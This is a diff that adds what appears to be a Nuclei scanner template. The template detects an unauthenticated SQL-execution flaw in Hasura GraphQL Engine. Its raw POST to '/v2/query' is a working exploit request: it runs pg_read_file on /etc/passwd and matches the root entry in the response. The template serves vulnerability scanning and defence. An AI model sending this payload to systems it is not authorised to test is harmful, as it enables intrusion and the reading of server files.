@@ -1,0 +1,39 @@
+id: hasura-graphql-psql-exec
+
+info:
+  name: Hasura GraphQL Engine - postgresql query exec
+  author: Udyz
+  severity: critical
+  description: A vulnerability in Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/query' endpoint.
+  reference:
+    - https://www.exploit-db.com/exploits/49802
+  tags: hasura,rce,graphql
+
+requests:
+  - raw:
+      - |
+        POST /v2/query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "type": "bulk",
+          "source": "default",
+          "args":[
+            {
+              "type": "run_sql",
+              "args": {
+                "source":"default",
+                "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
+                "cascade": false,
+                "read_only": false
+              }
+            }
+          ]
+        }
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
